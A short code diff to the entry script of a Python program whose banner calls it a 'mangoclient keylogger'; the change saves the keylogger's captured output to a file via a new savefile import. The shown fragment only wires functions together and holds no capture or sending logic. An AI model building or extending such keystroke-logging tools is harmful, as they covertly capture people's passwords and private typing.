@@ -2,6 +2,8 @@ from loggermain import keylogger
 import os 
 import textwrap
 
+from savefile import savefile
+
 if __name__ == '__main__':
     print(textwrap.dedent("""
     jhyungleeCS | mangoclient keylogger
@@ -10,5 +12,6 @@ if __name__ == '__main__':
     Logging KeyStrokes ~: 
     """))
 
-    keylogger()
+    keylog = keylogger()
+    savefile(keylog)
 
